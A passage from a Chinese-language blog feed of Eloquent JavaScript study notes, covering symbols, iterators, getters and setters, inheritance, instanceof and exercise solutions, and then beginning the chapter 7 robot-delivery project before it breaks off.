<p>第四章提到的<code>for/of</code>循环可以遍历几种数据结构。这是另一种多态的例子。这样的循环期望数据结构暴露一个特定的接口，数组和字符串就是这样。我们也可以在我们自己的对象中添加这个接口！但是做这个之前，先要知道symbol是什么。</p>
<h2 id="symbols"><a href="#symbols" class="headerlink" title="symbols"></a>symbols</h2><p>多个接口使用相同的名字做不同的事情是可能存在的。比如，我可以定义一个接口，接口中toString方法应该转换对象到一团纱线。对于对象不可能同时支持这个接口和toString的标准使用。</p>
<p>JS提供了一种解决方案。当物品说属性名是字符串时，说法并不准确。通常情况下是这样但是他们也可以是symbols。symbol是用<code>Symbol</code>函数创造的值。不像字符串，新创建的symbol是独一无二的，你不能创造同一个symbol两次。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> sym = <span class="built_in">Symbol</span>(<span class="string">"name"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(sym == <span class="built_in">Symbol</span>(<span class="string">"name"</span>));</span><br><span class="line"><span class="comment">// → false</span></span><br><span class="line">Rabbit.prototype[sym] = <span class="number">55</span>;</span><br><span class="line"><span class="built_in">console</span>.log(blackRabbit[sym]);</span><br><span class="line"><span class="comment">// → 55</span></span><br></pre></td></tr></table></figure>

<p>传递给<code>Symbol</code>的参数会在你将symbol转换为字符串的时候显示出来，并且使得识别一个symbol变得容易（比如在控制台打印的时候）。但是除了那个没有其他的意义了-多个symbol也可能有相同的值。</p>
<p>独一无二并且可用于属性名使得symbol很适合定义可以与其他属性和谐共处的接口，而且无论他们的名字是什么。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> toStringSymbol = <span class="built_in">Symbol</span>(<span class="string">"toString"</span>);</span><br><span class="line"><span class="built_in">Array</span>.prototype[toStringSymbol] = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.length&#125;</span> cm of blue yarn`</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>, <span class="number">2</span>].toString());</span><br><span class="line"><span class="comment">// → 1,2</span></span><br><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>, <span class="number">2</span>][toStringSymbol]());</span><br><span class="line"><span class="comment">// → 2 cm of blue yarn</span></span><br></pre></td></tr></table></figure>

<p>可以在对象表达式和类中通过在属性名外面包裹中括号包含symbol属性。这使得属性名将会被求值，有点像对象的方括号获取属性标记，允许我们参考保存symbol的变量。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> stringObject = &#123;</span><br><span class="line">  [toStringSymbol]() &#123; <span class="keyword">return</span> <span class="string">"a jute rope"</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(stringObject[toStringSymbol]());</span><br><span class="line"><span class="comment">// → a jute rope</span></span><br></pre></td></tr></table></figure>

<h2 id="迭代器接口"><a href="#迭代器接口" class="headerlink" title="迭代器接口"></a>迭代器接口</h2><p><code>for/of</code>循环的参数对象被期望是<code>iterable</code>。这意味着它有一个名为<code>Symbol.iterator</code>（是一个语言定义的symbol，存储在Symbol中）的方法。</p>
<p>当被调用的时候，方法应该返回一个提供第二个接口的对象，也就是<code>iterator</code>。这就是它迭代的实际的东西。有一个<code>next</code>方法返回下一个结果。结果应该是一个拥有<code>value</code>属性和<code>done</code>属性的对象。value表示下一个值，而done表示是否遍历完成。</p>
<p><code>next</code>,<code>value</code>,<code>done</code>属性名都是普通字符串而不是symbols。只有<code>Symbol.iterator</code>，可能被添加一些不同的对象，是一个实际的symbol。</p>
<p>我们可以直接使用这个接口。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// okIterator是对字符串"OK"迭代的迭代器</span></span><br><span class="line"><span class="keyword">let</span> okIterator = <span class="string">"OK"</span>[<span class="built_in">Symbol</span>.iterator]();</span><br><span class="line"><span class="built_in">console</span>.log(okIterator.next());</span><br><span class="line"><span class="comment">// → &#123;value: "O", done: false&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(okIterator.next());</span><br><span class="line"><span class="comment">// → &#123;value: "K", done: false&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(okIterator.next());</span><br><span class="line"><span class="comment">// → &#123;value: undefined, done: true&#125;</span></span><br></pre></td></tr></table></figure>

<p>让我们实现一个iterable的数据结构。我们将构建一个矩阵类。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Matrix</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(width, height, element = (x, y) =&gt; undefined) &#123;</span><br><span class="line">        <span class="keyword">this</span>.width = width;</span><br><span class="line">        <span class="keyword">this</span>.height = height;</span><br><span class="line">        <span class="keyword">this</span>.content = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> y = <span class="number">0</span>; y &lt; height; y++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">let</span> x = <span class="number">0</span>; x &lt; width; x++) &#123;</span><br><span class="line">                <span class="keyword">this</span>.content[y * width + x] = element(x, y);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">get</span>(x, y) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.content[y * <span class="keyword">this</span>.width + x];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">set</span>(x, y, value) &#123;</span><br><span class="line">        <span class="keyword">this</span>.content[y * <span class="keyword">this</span>.width + x] = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个矩阵类将内容存放在一个<code>width * height</code>个元素的一维数组中。元素一行挨一行的被存储并用基于0的索引。如第五行的第三个元素的索引是<code>4 * width + 2</code>。</p>
<p>构造器方法接受width，height以及一个可选的用域填充矩阵初始值的函数。同时还包含get和set方法，分别用于检索和改变矩阵中的值。</p>
<p>当遍历一个矩阵的时候，除了对元素本身感兴趣还对元素的位置感兴趣。所以我们的迭代器将会产生一个对象，并拥有x，y和value属性。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MatrixIterator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(matrix) &#123;</span><br><span class="line">        <span class="keyword">this</span>.x = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.y = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.matrix = matrix;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    next() &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.y == <span class="keyword">this</span>.matrix.height) <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> value = &#123;<span class="attr">x</span>: <span class="keyword">this</span>.x, <span class="attr">y</span>:<span class="keyword">this</span>.y, <span class="attr">value</span>: <span class="keyword">this</span>.matrix.get(<span class="keyword">this</span>.x, <span class="keyword">this</span>.y)&#125;;</span><br><span class="line">        <span class="keyword">this</span>.x++;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.x == <span class="keyword">this</span>.matrix.width) &#123;</span><br><span class="line">            <span class="keyword">this</span>.x = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">this</span>.y++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;value, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个类用x和y属性追踪迭代矩阵的进度。<code>next</code>方法首先见擦汗矩阵的底部是否被到达。如果尚未到达，创造一个对象，用来保存当前值并且随后改变位置，如果有必要的话移动到下一行。</p>
<p>我们通过以下代码让Matrix类可迭代。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Matrix.prototype[<span class="built_in">Symbol</span>.iterator] = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> MatrixIterator(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们现在就可以用<code>for/of</code>迭代矩阵了。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> matrix = <span class="keyword">new</span> Matrix(<span class="number">2</span>, <span class="number">2</span>, (x, y) =&gt; <span class="string">`value <span class="subst">$&#123;x&#125;</span>,<span class="subst">$&#123;y&#125;</span>`</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> &#123;x, y, value&#125; <span class="keyword">of</span> matrix) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(x, y, value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// → 0 0 value 0,0</span></span><br><span class="line"><span class="comment">// → 1 0 value 1,0</span></span><br><span class="line"><span class="comment">// → 0 1 value 0,1</span></span><br><span class="line"><span class="comment">// → 1 1 value 1,1</span></span><br></pre></td></tr></table></figure>

<h2 id="getter-setter-static"><a href="#getter-setter-static" class="headerlink" title="getter, setter, static"></a>getter, setter, static</h2><p>接口通常包含方法，但是包含保存非函数值的属性也是可以的。例如，Map对象有一个size属性告诉你map中有多少键。</p>
<p>没必要在实例的属性中直接计算和存储这样一个属性。即便是直接获取的属性背后也可能隐藏着一个方法调用。这样的方法叫做<code>getters</code>，并且他们通过在对象表达式或者类声明中在方法名前面加上<code>get</code>定义。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> varyingSize = &#123;</span><br><span class="line">  <span class="keyword">get</span> size() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">100</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(varyingSize.size);</span><br><span class="line"><span class="comment">// → 73</span></span><br><span class="line"><span class="built_in">console</span>.log(varyingSize.size);</span><br><span class="line"><span class="comment">// → 49</span></span><br></pre></td></tr></table></figure>

<p>每当有人读取这个对象的size属性时，关联的方法就被调用。可以在写属性的时候利用一个<code>setter</code>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Temperature</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(celsius) &#123;</span><br><span class="line">    <span class="keyword">this</span>.celsius = celsius;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">get</span> fahrenheit() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.celsius * <span class="number">1.8</span> + <span class="number">32</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">set</span> fahrenheit(value) &#123;</span><br><span class="line">    <span class="keyword">this</span>.celsius = (value - <span class="number">32</span>) / <span class="number">1.8</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> fromFahrenheit(value) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Temperature((value - <span class="number">32</span>) / <span class="number">1.8</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> temp = <span class="keyword">new</span> Temperature(<span class="number">22</span>);</span><br><span class="line"><span class="built_in">console</span>.log(temp.fahrenheit);</span><br><span class="line"><span class="comment">// → 71.6</span></span><br><span class="line">temp.fahrenheit = <span class="number">86</span>;</span><br><span class="line"><span class="built_in">console</span>.log(temp.celsius);</span><br><span class="line"><span class="comment">// → 30</span></span><br></pre></td></tr></table></figure>
<p><code>Temperature</code>类只允许你读取或者写温度，要么以摄氏度的形式或者华氏度的形式。但是内部只存储了摄氏度，只是在<code>fahrenheit</code>的getter和setter中自动转换。</p>
<p>有时想要直接关联一些属性到构造器函数，而不是原型。这样的方法不能直接被实例访问，但是可以被用于提供一种额外的方式去创造实例。</p>
<p>在类声明内部，以static开头的方法存储在构造器中，所以<code>Temperature</code>类允许<code>Temperature.fromFahrenheit(100)</code>用华氏度去创造一个<code>Temperature</code>实例。</p>
<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>一些矩阵是对称的，也就是坐标x,y和坐标y,x的值保持相同。</p>
<p>设想我们需要一个类似<code>Matrix</code>的数据结构但是是对称结构的。我们可以从头写一个，但会有大量重复代码。</p>
<p>JS的原型系统允许我们创造一个类似于旧类的新类，同时重新对属性定义。新类的原型派生自旧的原型，但是为set方法添加了一个新的定义。</p>
<p>在面向对象的编程术语中，这叫做继承(inheritance)。新的类从旧类继承属性和行为。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SymmetricMatrix</span> <span class="keyword">extends</span> <span class="title">Matrix</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(size, element = (x, y) =&gt; undefined) &#123;</span><br><span class="line">    <span class="keyword">super</span>(size, size, (x, y) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (x &lt; y) <span class="keyword">return</span> element(y, x);</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">return</span> element(x, y);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">set</span>(x, y, value) &#123;</span><br><span class="line">    <span class="keyword">super</span>.set(x, y, value);</span><br><span class="line">    <span class="keyword">if</span> (x != y) &#123;</span><br><span class="line">      <span class="keyword">super</span>.set(y, x, value);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> matrix = <span class="keyword">new</span> SymmetricMatrix(<span class="number">5</span>, (x, y) =&gt; <span class="string">`<span class="subst">$&#123;x&#125;</span>,<span class="subst">$&#123;y&#125;</span>`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(matrix.get(<span class="number">2</span>, <span class="number">3</span>));</span><br><span class="line"><span class="comment">// → 3,2</span></span><br></pre></td></tr></table></figure>

<p><code>extends</code>关键字的使用表明这个类不应该基于默认的<code>Object</code>原型而是其他类。这个被基于的类叫做superclass(父类),派生出来的类叫做subclass(子类)。</p>
<p>为了初始化一个<code>SymmetricMatrix</code>实例，构造器需要通过<code>super</code>关键字调用父类的构造器。这是必要的因为新类需要表现得和父类一致。为了确保矩阵对称，对对角线以下的坐标进行交换。</p>
<p>set方法再一次用了super关键字，不过这一次是调用父类中特定的方法。super提供了一种调用父类方法的能力。</p>
<p>继承允许我们费更少的劲去构建稍微不同于已有的数据类型的数据类型。它也是面向对象传统的一部分，其他两者是封装和多态，后两个是精彩的主意，但是继承存在争议。</p>
<p>继承将类缠结在一起，增加了程序的耦合度，而封装和多态可以被用于彼此分离的代码。当要继承一个类时，必须要知道这个类是怎样工作的。继承是一个有用的工具，但是不应该是你寻求的第一手工具。</p>
<h2 id="instanceof操作符"><a href="#instanceof操作符" class="headerlink" title="instanceof操作符"></a>instanceof操作符</h2><p>有时知道是否一个对象派生自一个特定的类是有用的，JS提供了一个叫做<code>instanceof</code>的二元操作符。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(</span><br><span class="line">  <span class="keyword">new</span> SymmetricMatrix(<span class="number">2</span>) <span class="keyword">instanceof</span> SymmetricMatrix);</span><br><span class="line"><span class="comment">// → true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> SymmetricMatrix(<span class="number">2</span>) <span class="keyword">instanceof</span> Matrix);</span><br><span class="line"><span class="comment">// → true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> Matrix(<span class="number">2</span>, <span class="number">2</span>) <span class="keyword">instanceof</span> SymmetricMatrix);</span><br><span class="line"><span class="comment">// → false</span></span><br><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>] <span class="keyword">instanceof</span> <span class="built_in">Array</span>);</span><br><span class="line"><span class="comment">// → true</span></span><br></pre></td></tr></table></figure>

<p>这个操作符可以看见继承的类型，所以<code>SymmetricMatrix</code>也是<code>Matrix</code>的一个实例。操作符也可被用于标准的如<code>Array</code>这样的构造器。差不多所有的对象都是<code>Object</code>的实例。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对象不仅仅只保存自己的属性，他们有一个原型，是其他的对象。他们表现的就好像拥有自己没有的属性只要他们的原型拥有这个属性。普通对象的原型都是<code>Object.prototype</code>。</p>
<p>构造器函数名字以大写字母开头，可用<code>new</code>操作符创造新对象。新对象的原型是构造器的<code>prototype</code>属性。通过这个特性可以将所有实例共享的属性放到原型中。同时也有一个<code>class</code>标记提供了一种更清晰的方式去定义构造器和构造器的原型。</p>
<p>可以定义getters和setters，每当对象的属性被获取的时候调用对应的方法。静态方法是直接存储到构造器中的方法，而不是原型。</p>
<p><code>instanceof</code>操作符可以通过给定一个对象和一个构造器，告诉你是否这个对象是这个构造器的一个实例。</p>
<p>关于对象一个很有用的事是为他们指定一个接口，并且所有人应该只通过这个接口和你的对象交互。其余的组成对象的细节被封装起来，隐藏在接口后面。</p>
<p>不止一种类型可以实现同一个接口。使用接口的代码自动知道如何与提供这个接口的不同对象交互。这叫做多态。</p>
<p>当实现只是在某些细节方面不同的类，将新的类作为旧类的字类是很有用的，继承了父类的部分行为。</p>
<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="一个vector类型"><a href="#一个vector类型" class="headerlink" title="一个vector类型"></a>一个vector类型</h3><p>写一个<code>Vec</code>类代表一个二维空间的矢量。接受x和y参数（数字），应该保存到同名的属性中。</p>
<p>给<code>Vec</code>原型两个方法，<code>plus``minus</code>方法，接受一个不同的矢量对象，返回一个新的vector。</p>
<p>为原型添加一个getter属性<code>length</code>来计算矢量的长度（到0,0的距离）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Your code here.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vec</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(x, y) &#123;</span><br><span class="line">        <span class="keyword">this</span>.x = x;</span><br><span class="line">        <span class="keyword">this</span>.y = y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    plus(vector) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Vec(<span class="keyword">this</span>.x + vector.x, <span class="keyword">this</span>.y + vector.y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    minus(vector) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Vec(<span class="keyword">this</span>.x - vector.x, <span class="keyword">this</span>.y - vector.y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">get</span> length() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Math</span>.sqrt(<span class="keyword">this</span>.x * <span class="keyword">this</span>.x + <span class="keyword">this</span>.y * <span class="keyword">this</span>.y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> Vec(<span class="number">1</span>, <span class="number">2</span>).plus(<span class="keyword">new</span> Vec(<span class="number">2</span>, <span class="number">3</span>)));</span><br><span class="line"><span class="comment">// → Vec&#123;x: 3, y: 5&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> Vec(<span class="number">1</span>, <span class="number">2</span>).minus(<span class="keyword">new</span> Vec(<span class="number">2</span>, <span class="number">3</span>)));</span><br><span class="line"><span class="comment">// → Vec&#123;x: -1, y: -1&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> Vec(<span class="number">3</span>, <span class="number">4</span>).length);</span><br><span class="line"><span class="comment">// → 5</span></span><br></pre></td></tr></table></figure>

<h3 id="groups"><a href="#groups" class="headerlink" title="groups"></a>groups</h3><p>标准JS环境提供了一个叫做set的数据结构。其实就是个不允许有重复元素的集合。</p>
<p>写一个名为<code>Group</code>的类。类似于<code>Set</code>，它有<code>add</code>,<code>delete</code>,<code>has</code>方法。构造器创造一个空的group，<code>add</code>方法添加一个值到group中（如果存在）。<code>delete</code>从group中删除一个元素，<code>has</code>返回一个布尔值表明是否参数是group中的一员。</p>
<p>使用<code>===</code>操作符或者<code>indexOf</code>确定是否两个值一样。</p>
<p>给定一个静态的<code>from</code>方法，接受一个可迭代的对象，通过迭代它所有的值创造一个group。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Group</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Your code here.</span></span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">      <span class="keyword">this</span>.content = [];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  add(element) &#123;</span><br><span class="line">      <span class="keyword">if</span>(!<span class="keyword">this</span>.has(element)) <span class="keyword">this</span>.content.push(element);   </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">delete</span>(element) &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">this</span>.has(element)) &#123;</span><br><span class="line">          <span class="keyword">this</span>.content = <span class="keyword">this</span>.content.filter(<span class="function"><span class="params">x</span> =&gt;</span> x !== element);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  has(element) &#123;</span><br><span class="line">  	<span class="keyword">return</span> <span class="keyword">this</span>.content.includes(element);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">from</span>(iterable) &#123;</span><br><span class="line">      <span class="keyword">let</span> g = <span class="keyword">new</span> Group();</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">let</span> element <span class="keyword">of</span> iterable) &#123;</span><br><span class="line">         g.add(element);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> g;  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> group = Group.from([<span class="number">10</span>, <span class="number">20</span>]);</span><br><span class="line"><span class="built_in">console</span>.log(group.has(<span class="number">10</span>));</span><br><span class="line"><span class="comment">// → true</span></span><br><span class="line"><span class="built_in">console</span>.log(group.has(<span class="number">30</span>));</span><br><span class="line"><span class="comment">// → false</span></span><br><span class="line">group.add(<span class="number">10</span>);</span><br><span class="line">group.delete(<span class="number">10</span>);</span><br><span class="line"><span class="built_in">console</span>.log(group.has(<span class="number">10</span>));</span><br><span class="line"><span class="comment">// → false</span></span><br></pre></td></tr></table></figure>

<h3 id="可迭代的groups"><a href="#可迭代的groups" class="headerlink" title="可迭代的groups"></a>可迭代的groups</h3><p>在前面的部分参考<code>iterator</code>接口的使用方法，使得<code>Group</code>类可迭代。</p>
<p>如果你用数组代表一个group的成员，不要返回一个调用数组的<code>Symbol.iterator</code>方法返回的迭代器。那不是这个练习的目的。</p>
<p>如果group在迭代过程中被改变你的迭代器会表现得异常是OK的。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Your code here (and the code from the previous exercise)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Group</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Your code here.</span></span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">      <span class="keyword">this</span>.content = [];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  add(element) &#123;</span><br><span class="line">      <span class="keyword">if</span>(!<span class="keyword">this</span>.has(element)) <span class="keyword">this</span>.content.push(element);   </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">delete</span>(element) &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">this</span>.has(element)) &#123;</span><br><span class="line">          <span class="keyword">this</span>.content = <span class="keyword">this</span>.content.filter(<span class="function"><span class="params">x</span> =&gt;</span> x !== element);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  has(element) &#123;</span><br><span class="line">  	<span class="keyword">return</span> <span class="keyword">this</span>.content.includes(element);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">from</span>(iterable) &#123;</span><br><span class="line">      <span class="keyword">let</span> g = <span class="keyword">new</span> Group();</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">let</span> element <span class="keyword">of</span> iterable) &#123;</span><br><span class="line">         g.add(element);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> g;  </span><br><span class="line">  &#125;</span><br><span class="line">  [<span class="built_in">Symbol</span>.iterator]() &#123;</span><br><span class="line">  	<span class="keyword">return</span> <span class="keyword">new</span> GroupIterator(<span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GroupIterator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(group) &#123;</span><br><span class="line">        <span class="keyword">this</span>.position = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.group = group;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    next() &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.position &gt;= <span class="keyword">this</span>.group.content.length) <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> value = <span class="keyword">this</span>.group.content[<span class="keyword">this</span>.position];</span><br><span class="line">        <span class="keyword">this</span>.position++;</span><br><span class="line">        <span class="keyword">return</span> &#123;value, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> value <span class="keyword">of</span> Group.from([<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>])) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// → a</span></span><br><span class="line"><span class="comment">// → b</span></span><br><span class="line"><span class="comment">// → c</span></span><br></pre></td></tr></table></figure>

<h3 id="借用一个方法"><a href="#借用一个方法" class="headerlink" title="借用一个方法"></a>借用一个方法</h3><p>早先提到过，<code>hasOwnProperty</code>可作为更加健壮的<code>in</code>操作符的替代，如果想忽略原型上的属性时。但是如果你的map需要包含<code>hasOwnProperty</code>键呢？这个属性就会遮蔽掉这个方法值。想一个办法解决这个问题。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> map = &#123;<span class="attr">one</span>: <span class="literal">true</span>, <span class="attr">two</span>: <span class="literal">true</span>, <span class="attr">hasOwnProperty</span>: <span class="literal">true</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fix this call</span></span><br><span class="line"><span class="built_in">console</span>.log(map.hasOwnProperty(<span class="string">"one"</span>));</span><br><span class="line"><span class="comment">// → true</span></span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.prototype.hasOwnProperty.call(map, <span class="string">"one"</span>));</span><br></pre></td></tr></table></figure>
<p><code>hasOwnProperty</code>方法来自于<code>Object.property</code>，而<br>函数的call方法可以指定函数调用的<code>this</code>绑定。</p>
]]></content>
      <categories>
        <category>Eloquent JavaScript</category>
      </categories>
  </entry>
  <entry>
    <title>EJ7</title>
    <url>/2018/12/27/EJ7/</url>
    <content><![CDATA[<h1 id="项目：机器人"><a href="#项目：机器人" class="headerlink" title="项目：机器人"></a>项目：机器人</h1><p>在项目章节，我们将停止学习新知识，我们会一起做个项目。学习编程的理论是必须的，但是阅读和理解实际程序也是很重要的。</p>
<p>我们这个项目会构建一个在虚拟世界实现投递包裹的机器人。</p>
<a id="more"></a>

<h2 id="Meadowfield（梅多菲尔德）"><a href="#Meadowfield（梅多菲尔德）" class="headerlink" title="Meadowfield（梅多菲尔德）"></a>Meadowfield（梅多菲尔德）</h2><p>MEADOWFIELD村子不是特别大。它包含11个场所和14条街道。可以用这个路数组描述这个村子。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> roads = [</span><br><span class="line">  <span class="string">"Alice's House-Bob's House"</span>,   <span class="string">"Alice's House-Cabin"</span>,</span><br><span class="line">  <span class="string">"Alice's House-Post Office"</span>,   <span class="string">"Bob's House-Town Hall"</span>,</span><br><span class="line">  <span class="string">"Daria's House-Ernie's House"</span>, <span class="string">"Daria's House-Town Hall"</span>,</span><br><span class="line">  <span class="string">"Ernie's House-Grete's House"</span>, <span class="string">"Grete's House-Farm"</span>,</span><br><span class="line">  <span class="string">"Grete's House-Shop"</span>,          <span class="string">"Marketplace-Farm"</span>,</span><br><span class="line">  <span class="string">"Marketplace-Post Office"</span>,     <span class="string">"Marketplace-Shop"</span>,</span><br><span class="line">  <span class="string">"Marketplace-Town Hall"</span>,       <span 